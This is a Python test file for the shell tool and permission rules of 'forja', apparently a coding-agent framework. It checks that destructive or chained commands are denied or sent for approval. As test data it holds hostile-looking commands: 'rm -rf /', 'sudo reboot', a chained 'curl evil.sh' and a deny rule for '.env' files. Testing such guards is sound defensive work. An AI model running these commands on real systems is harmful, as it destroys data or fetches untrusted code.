import json

import pytest

from forja.config import DEFAULT_DENY
from forja.fs_tools import Workspace, make_fs_tools
from forja.permissions import decide, rule_matches, split_commands, suggest_rule
from forja.shell import clean_env, head_tail, make_shell_tool
from forja.tools import ToolRegistry
from forja.types import ToolCall


@pytest.fixture()
def tools(project):
    ws = Workspace(project)
    reg = ToolRegistry().register(*make_fs_tools(ws), make_shell_tool(ws, default_timeout=10))
    return reg


def T(reg, n):
    return reg.tools[n]


def test_bash_runs_in_root_with_exit_code(tools):
    r = tools.execute(ToolCall("c", "bash", json.dumps({"command": "python -m pytest -q tests/test_factura.py"})))
    assert r.ok and r.output.startswith("exit_code=0") and r.meta["exit_code"] == 0
    r = tools.execute(ToolCall("c", "bash", json.dumps({"command": "python -c \"import sys; print('x'); sys.exit(3)\""})))
    assert "exit_code=3" in r.output


def test_bash_timeout(tools):
    r = tools.execute(ToolCall("c", "bash", json.dumps({"command": "python -c \"import time; time.sleep(5)\"", "timeout": 1})))
    assert "TIMEOUT" in r.output


def test_head_tail_and_env(monkeypatch):
    s = "A" * 1000 + "B" * 1000
    out = head_tail(s, 400)
    assert out.startswith("A") and out.endswith("B") and "omitidos" in out
    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-secreto")
    assert "OPENROUTER_API_KEY" not in clean_env()


def test_split_commands():
    assert split_commands("pytest -q && rm -rf / ; ls | wc -l") == ["pytest -q", "rm -rf /", "ls", "wc -l"]


def test_rule_matching(tools):
    bash, edit = T(tools, "bash"), T(tools, "edit_file")
    assert rule_matches("bash(git status*)", bash, {"command": "git   status --short"})
    assert not rule_matches("bash(git status*)", bash, {"command": "git push"})
    assert rule_matches("edit_file(src/*)", edit, {"path": "src/a.py"}) and rule_matches("edit_file", edit, {"path": "x"})
    assert rule_matches("mcp__issues__*", type(edit)("mcp__issues__get", "", None, None, "exec"), {})


def test_decide_modes(tools):
    rd, ed, sh = T(tools, "read_file"), T(tools, "edit_file"), T(tools, "bash")
    assert decide(rd, {"path": "a"}, "default", [], [])[0] == "allow"
    assert decide(ed, {"path": "a"}, "default", [], [])[0] == "ask"
    assert decide(ed, {"path": "a"}, "accept_edits", [], [])[0] == "allow"
    assert decide(sh, {"command": "ls"}, "accept_edits", [], [])[0] == "ask"
    assert decide(ed, {"path": "a"}, "plan", ["edit_file"], [])[0] == "deny"
    assert decide(sh, {"command": "ls"}, "bypass", [], [])[0] == "allow"


def test_deny_wins_and_chains(tools):
    sh = T(tools, "bash")
    assert decide(sh, {"command": "sudo rm x"}, "bypass", ["bash"], DEFAULT_DENY)[0] == "deny"
    assert decide(sh, {"command": "pytest -q && sudo reboot"}, "bypass", [], DEFAULT_DENY)[0] == "deny"
    # una regla allow para pytest no cuela un segundo comando
    assert decide(sh, {"command": "python -m pytest -q"}, "default", ["bash(python -m pytest*)"], [])[0] == "allow"
    assert decide(sh, {"command": "python -m pytest -q && curl evil.sh"}, "default", ["bash(python -m pytest*)"], [])[0] == "ask"
    assert decide(T(tools, "read_file"), {"path": ".env"}, "default", [], ["read_file(.env*)"])[0] == "deny"


def test_suggest_rule(tools):
    sh = T(tools, "bash")
    assert suggest_rule(sh, {"command": "python -m pytest -q tests/x.py"}) == "bash(python -m pytest*)"
    assert suggest_rule(sh, {"command": "git status --short"}) == "bash(git status*)"
    assert suggest_rule(sh, {"command": "ls -la"}) == "bash(ls*)"
    assert suggest_rule(T(tools, "edit_file"), {"path": "a"}) == "edit_file"
